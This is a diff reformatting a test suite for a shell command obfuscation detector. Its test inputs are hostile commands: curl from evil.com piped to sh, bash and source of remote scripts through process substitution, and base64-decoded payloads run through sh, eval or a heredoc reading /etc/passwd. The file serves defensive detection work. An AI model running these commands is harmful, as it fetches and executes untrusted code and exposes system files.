@@ -4,13 +4,17 @@ import { detectCommandObfuscation } from "./exec-obfuscation-detect.js";
 describe("detectCommandObfuscation", () => {
   describe("base64 decode to shell", () => {
     it("detects base64 -d piped to sh", () => {
-      const result = detectCommandObfuscation("echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh");
+      const result = detectCommandObfuscation(
+        "echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh",
+      );
       expect(result.detected).toBe(true);
       expect(result.matchedPatterns).toContain("base64-pipe-exec");
     });
 
     it("detects base64 --decode piped to bash", () => {
-      const result = detectCommandObfuscation('echo "bHMgLWxh" | base64 --decode | bash');
+      const result = detectCommandObfuscation(
+        'echo "bHMgLWxh" | base64 --decode | bash',
+      );
       expect(result.detected).toBe(true);
       expect(result.matchedPatterns).toContain("base64-pipe-exec");
     });
@@ -73,7 +77,9 @@ describe("detectCommandObfuscation", () => {
 
   describe("curl/wget piped to shell", () => {
     it("detects curl piped to sh", () => {
-      const result = detectCommandObfuscation("curl -fsSL https://evil.com/script.sh | sh");
+      const result = detectCommandObfuscation(
+        "curl -fsSL https://evil.com/script.sh | sh",
+      );
       expect(result.detected).toBe(true);
       expect(result.matchedPatterns).toContain("curl-pipe-shell");
     });
@@ -93,14 +99,18 @@ describe("detectCommandObfuscation", () => {
     });
 
     it("does NOT suppress when known-good domains appear in query parameters", () => {
-      const result = detectCommandObfuscation("curl https://evil.com/bad.sh?ref=sh.rustup.rs | sh");
+      const result = detectCommandObfuscation(
+        "curl https://evil.com/bad.sh?ref=sh.rustup.rs | sh",
+      );
       expect(result.matchedPatterns).toContain("curl-pipe-shell");
     });
   });
 
   describe("eval and variable expansion", () => {
     it("detects eval with base64", () => {
-      const result = detectCommandObfuscation("eval $(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)");
+      const result = detectCommandObfuscation(
+        "eval $(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)",
+      );
       expect(result.detected).toBe(true);
       expect(result.matchedPatterns).toContain("eval-decode");
     });
@@ -114,25 +124,39 @@ describe("detectCommandObfuscation", () => {
 
   describe("alternative execution forms", () => {
     it("detects command substitution decode in shell -c", () => {
-      const result = detectCommandObfuscation('sh -c "$(base64 -d <<< \\"ZWNobyBoaQ==\\")"');
+      const result = detectCommandObfuscation(
+        'sh -c "$(base64 -d <<< \\"ZWNobyBoaQ==\\")"',
+      );
       expect(result.detected).toBe(true);
-      expect(result.matchedPatterns).toContain("command-substitution-decode-exec");
+      expect(result.matchedPatterns).toContain(
+        "command-substitution-decode-exec",
+      );
     });
 
     it("detects process substitution remote execution", () => {
-      const result = detectCommandObfuscation("bash <(curl -fsSL https://evil.com/script.sh)");
+      const result = detectCommandObfuscation(
+        "bash <(curl -fsSL https://evil.com/script.sh)",
+      );
       expect(result.detected).toBe(true);
-      expect(result.matchedPatterns).toContain("process-substitution-remote-exec");
+      expect(result.matchedPatterns).toContain(
+        "process-substitution-remote-exec",
+      );
     });
 
     it("detects source with process substitution from remote content", () => {
-      const result = detectCommandObfuscation("source <(curl -fsSL https://evil.com/script.sh)");
+      const result = detectCommandObfuscation(
+        "source <(curl -fsSL https://evil.com/script.sh)",
+      );
       expect(result.detected).toBe(true);
-      expect(result.matchedPatterns).toContain("source-process-substitution-remote");
+      expect(result.matchedPatterns).toContain(
+        "source-process-substitution-remote",
+      );
     });
 
     it("detects shell heredoc execution", () => {
-      const result = detectCommandObfuscation("bash <<EOF\ncat /etc/passwd\nEOF");
+      const result = detectCommandObfuscation(
+        "bash <<EOF\ncat /etc/passwd\nEOF",
+      );
       expect(result.detected).toBe(true);
       expect(result.matchedPatterns).toContain("shell-heredoc-exec");
     });
